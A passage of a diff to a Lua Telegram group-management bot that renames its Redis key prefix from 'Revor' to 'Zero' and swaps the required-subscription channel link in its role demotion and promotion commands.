 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مطور ").Reply,"md",true)  
 end
 end
@@ -2780,10 +2783,10 @@ if UserName[1] == "مالك" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مالك مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مالك ").Reply,"md",true)  
 end
 end
@@ -2792,13 +2795,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -2807,13 +2810,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المنشئين ").Reply,"md",true)  
 end
 end
@@ -2822,13 +2825,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المدراء ").Reply,"md",true)  
 end
 end
@@ -2837,13 +2840,13 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من الادمنيه ").Reply,"md",true)  
 end
 end
@@ -2852,13 +2855,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId_Info.id) 
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المميزبن ").Reply,"md",true)  
 end
 end
@@ -2878,13 +2881,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:DevelopersQ:Groups",Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :DevelopersQ:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:DevelopersQ:Groups",Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :DevelopersQ:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -2893,13 +2896,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مطور مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مطور ").Reply,"md",true)  
 end
 end
@@ -2907,10 +2910,10 @@ if TextMsg == "مالك" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مالك مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله مالك ").Reply,"md",true)  
 end
 end
@@ -2919,13 +2922,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -2934,13 +2937,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المنشئين ").Reply,"md",true)  
 end
 end
@@ -2949,13 +2952,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المدراء ").Reply,"md",true)  
 end
 end
@@ -2964,13 +2967,13 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من الادمنيه ").Reply,"md",true)  
 end
 end
@@ -2979,13 +2982,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if not Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم تنزيله من المميزبن ").Reply,"md",true)  
 end
 end
@@ -3009,13 +3012,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId) then
+if not Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:DevelopersQ:Groups",UserId) 
+Redis:srem(Zero .."Zero :DevelopersQ:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم تنزيله مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -3024,13 +3027,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Developers:Groups",UserId) then
+if not Redis:sismember(Zero .."Zero :Developers:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم تنزيله مطور مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Developers:Groups",UserId) 
+Redis:srem(Zero .."Zero :Developers:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم تنزيله مطور ").Reply,"md",true)  
 end
 end
@@ -3038,10 +3041,10 @@ if UserId[1] == "مالك" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله مالك مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله مالك ").Reply,"md",true)  
 end
 end
@@ -3050,13 +3053,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -3065,13 +3068,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المنشئين ").Reply,"md",true)  
 end
 end
@@ -3080,13 +3083,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المدراء ").Reply,"md",true)  
 end
 end
@@ -3095,13 +3098,13 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من الادمنيه ").Reply,"md",true)  
 end
 end
@@ -3110,13 +3113,13 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId[2]) then
+if not Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId[2]) 
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم تنزيله من المميزبن ").Reply,"md",true)  
 end
 end
@@ -3138,13 +3141,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:DevelopersQ:Groups",UserId_Info.id) 
